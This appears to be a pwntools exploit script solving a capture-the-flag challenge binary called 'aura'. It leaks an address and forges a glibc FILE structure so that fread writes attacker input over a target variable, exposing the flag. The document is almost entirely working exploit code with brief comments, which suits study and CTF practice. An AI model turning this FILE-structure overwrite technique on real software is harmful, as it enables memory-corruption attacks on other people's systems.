from pwn import *
import sys

binary = "./aura_patched" if len(sys.argv) > 1 and '-p' in sys.argv else "./aura"

p = process(binary)

# Get aura address
p.recvuntil("my aura: ")
aura_addr = p.recvline()[:-1].decode()
aura_addr = aura_addr[2:]
aura_addr = bytes.fromhex(aura_addr)
aura_addr = int(aura_addr.hex(), 16)

print(f" aura at {hex(aura_addr)}")

p.recvuntil(b'ur aura? ')
  
# Complete FILE structure
payload  = p64(0x8000)                 # _flags                # _IO_USER_BUF flag 
payload += p64(0)                      # _IO_read_ptr          # set all reads to null to force fread to read from stdin
payload += p64(0)                      # _IO_read_end         
payload += p64(0)                      # _IO_read_base
payload += p64(0)                      # _IO_write base        # set writes to null because we are not using them
payload += p64(0)                      # _IO_write_ptr
payload += p64(0)                      # _IO_write_end  
payload += p64(aura_addr)              # _IO_buf_base      # start of address to write to
payload += p64(aura_addr + 0x10)       # _IO_base_end      # end of address to write to 
payload += p64(0) * 8                  # int _fileno somewhere here, set to 0 to force fread to read from stdin
payload += p64(0)                      #_IO_lock (after int _fileno)

p.sendline(payload)

# our stdin (fread uses this to write into aura)
p.sendline(b'A' * 100)                 # if you send as little as 16 you can read the flag 

p.interactive()